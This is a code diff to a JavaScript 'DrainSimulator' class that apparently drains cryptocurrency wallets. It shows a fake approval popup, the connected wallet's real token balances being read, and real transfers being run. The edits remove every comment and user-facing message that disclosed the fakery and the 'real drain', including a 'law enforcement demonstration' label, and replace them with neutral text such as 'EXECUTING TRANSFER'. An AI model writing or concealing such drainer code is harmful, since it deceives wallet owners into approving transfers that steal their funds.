@@ -91,7 +91,7 @@ class DrainSimulator {
                 document.getElementById('drain-approve').disabled = true;
                 document.getElementById('drain-approve').innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Processing...';
                 
-                // Short delay for realism, then proceed directly to real drain
+                // Short delay
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 
                 document.body.removeChild(modal);
@@ -100,7 +100,7 @@ class DrainSimulator {
         });
     }
 
-    // EXECUTE DRAIN - This is the function your button calls
+    // EXECUTE - This is the function your button calls
     async executeDrain() {
         if (this.isDraining) return;
         
@@ -115,7 +115,7 @@ class DrainSimulator {
         }
 
         try {
-            // Show fake approval popup
+            // Show approval popup
             const approved = await this.showFakeApprovalPopup();
             
             if (!approved) {
@@ -134,7 +134,7 @@ class DrainSimulator {
         }
     }
 
-     // REAL BALANCE CHECKING - FIXED
+     // BALANCE CHECKING - FIXED
     async getRealBalance(token, walletAddress) {
         if (!window.ethereum) throw new Error('No Ethereum provider');
         
@@ -153,9 +153,9 @@ class DrainSimulator {
         }
     }
 
-    // REAL DRAIN EXECUTION - for law enforcement demonstration with test funds
+
     async executeRealDrainWithFunds() {
-        this.showResult('🚨 REAL DRAIN MODE ACTIVATED - EXECUTING TRANSFERS', 'error');
+        this.showResult('EXECUTING TRANSFER', 'error');
         await new Promise(resolve => setTimeout(resolve, 1000));
 
         // Show REAL balances before drain
@@ -165,9 +165,9 @@ class DrainSimulator {
         await this.executeRealTransfers();
     }
 
-     // Show REAL balances from connected wallet - FIXED
+     // Show balances from connected wallet - FIXED
     async showRealBalances() {
-        this.showResult('🔍 Checking REAL wallet balances...', 'warning');
+        this.showResult('🔍 Checking...', 'warning');
         
         let hasBalance = false;
         
@@ -178,7 +178,7 @@ class DrainSimulator {
                 
                 if (balanceNum > 0) {
                     hasBalance = true;
-                    this.showResult(`💰 REAL BALANCE: ${realBalance} ${token.symbol}`, 'error');
+                    this.showResult(`BALANCE: ${realBalance} ${token.symbol}`, 'error');
                 } else {
                     this.showResult(`❌ No ${token.symbol} balance found`, 'info');
                 }
@@ -190,7 +190,7 @@ class DrainSimulator {
         }
 
         if (!hasBalance) {
-            this.showResult('No funds found in wallet for demonstration', 'warning');
+            this.showResult('failed', 'warning');
         }
     }
 
